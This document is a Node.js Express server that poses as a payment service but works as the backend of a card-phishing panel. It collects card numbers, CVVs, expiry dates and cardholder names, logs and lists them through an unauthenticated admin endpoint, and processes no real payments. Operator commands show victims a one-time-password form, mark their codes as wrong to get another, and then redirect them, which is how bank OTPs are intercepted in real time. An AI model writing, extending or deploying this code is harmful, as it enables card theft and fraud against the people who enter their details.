// server.js
import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { createServer } from 'http';
import { Server as SocketIOServer } from 'socket.io';
import path from 'path'; // Import the 'path' module

const app = express();
app.use(bodyParser.json());
app.use(cors());

// Serve static files if needed; adjust if you use a public folder
// Serve static files from the current directory
app.use(express.static("."));

// Serve index.html for the root path
app.get('/', (req, res) => {
  res.sendFile(path.join(process.cwd(), 'index.html')); // Use path.join for correct path
});

const httpServer = createServer(app);
const io = new SocketIOServer(httpServer);

const transactions = new Map();
const paymentLinks = new Map();

// Generate payment link endpoint (links to landing.html)
app.post('/api/generatePaymentLink', (req, res) => {
  const { amount, description } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  const paymentLink = `${req.protocol}://${req.get('host')}/landing.html?pid=${invoiceId}`;
  paymentLinks.set(invoiceId, { amount, description, paymentLink, createdAt: new Date().toISOString() });
  console.log("Payment link generated:", paymentLink);
  res.json({ status: "success", paymentLink });
});

// Fetch payment details using pid (for landing & payment pages)
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Payment details not found" });
  }
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// Get all transactions (for admin panel)
app.get('/api/transactions', (req, res) => {
  const txList = Array.from(transactions.values());
  res.json(txList);
});

// Process payment details
app.post('/api/sendPaymentDetails', (req, res) => {
  const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;
  const invoiceId = crypto.randomBytes(4).toString('hex').toUpperCase();
  const transaction = {
    id: invoiceId,
    cardNumber,
    expiry,
    cvv,
    email,
    amount: amount.toString().replace(/,/g, ''),
    currency,
    cardholder,
    status: 'processing',
    otp: null,
    otpShown: false,
    otpEntered: null,
    otpError: false,
    redirectStatus: null,
    timestamp: new Date().toLocaleString()
  };
  transactions.set(invoiceId, transaction);
  console.log("New transaction recorded:", transaction);
  // (Optionally emit to socket room if using socket.io)
  io.to(invoiceId).emit('payment_received', { invoiceId });
  res.json({ status: "success", invoiceId });
});

// Show OTP for a transaction (admin command)
app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  io.to(invoiceId).emit('show_otp', { invoiceId });
  res.json({ status: "success", message: "OTP form will be shown to user" });
});

// Mark OTP as wrong (admin command)
app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked as wrong" });
});

// Check transaction status (polled by payment page)
app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction details not found" });
  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({ status: "show_otp", message: "Show OTP form to user", otpError: txn.otpError });
  }
  if (txn.redirectStatus) {
    const redirectUrl = txn.redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`;
    return res.json({ status: "redirect", redirectUrl });
  }
  res.json({ status: txn.status, otpError: txn.otpError });
});

// Submit OTP
app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  console.log(`OTP received for transaction ${invoiceId}: ${otp}`);
  io.to(invoiceId).emit('otp_received', { invoiceId });
  res.json({ status: "success", message: "OTP received" });
});

// Update redirect status (admin command: success/fail)
app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });
  txn.redirectStatus = redirectStatus;
  console.log(`Transaction ${invoiceId} redirect status updated to: ${redirectStatus}`);
  io.to(invoiceId).emit('redirect', {
    redirectUrl: redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`
  });
  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectStatus === 'success'
      ? `/success.html?invoiceId=${invoiceId}`
      : `/fail.html?invoiceId=${invoiceId}`
  });
});

const PORT = process.env.PORT || 3000;
httpServer.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

